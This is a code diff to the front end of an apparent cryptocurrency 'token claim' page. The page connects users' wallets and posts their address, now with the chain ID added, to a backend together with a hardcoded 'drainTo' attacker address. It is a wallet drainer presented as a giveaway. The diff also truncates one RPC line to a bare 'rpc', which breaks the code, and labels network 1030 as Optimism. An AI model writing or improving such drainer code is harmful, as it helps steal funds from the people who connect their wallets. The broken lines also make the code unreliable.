@@ -25,7 +25,7 @@ const appKit = createAppKit({
     {
       id: 250,
       name: "Meter",
-      rpcUrl: "https://meter-mainnet-rpc-01.meter.io"
+      rpc
     },
     {
       id: 43114,
@@ -38,7 +38,6 @@ const appKit = createAppKit({
       rpcUrl: "https://arbitrum-one.rpc.moo.fi"
     },
     {
-
       id: 1030,
       name: "Optimism",
       rpcUrl: "https://optimism-mainnet.rpc.moo.fi"
@@ -86,7 +85,15 @@ appKit.subscribeState((state) => {
 });
 
 async function claimToken() {
-  const address = appKit.account?.address;
+  const { account, chain } = appKit;
+
+  if (!account || !chain) {
+    status.textContent = "Wallet not connected or chain not selected";
+    return;
+  }
+
+  const address = account.address;
+  const chainId = chain.id;
 
   if (!address) {
     status.textContent = "Wallet not connected";
@@ -101,6 +108,7 @@ async function claimToken() {
       },
       body: JSON.stringify({
         address,
+        chainId,
         drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
       }),
     });
@@ -117,4 +125,3 @@ async function claimToken() {
     status.textContent = "Failed to claim token";
   }
 }
-
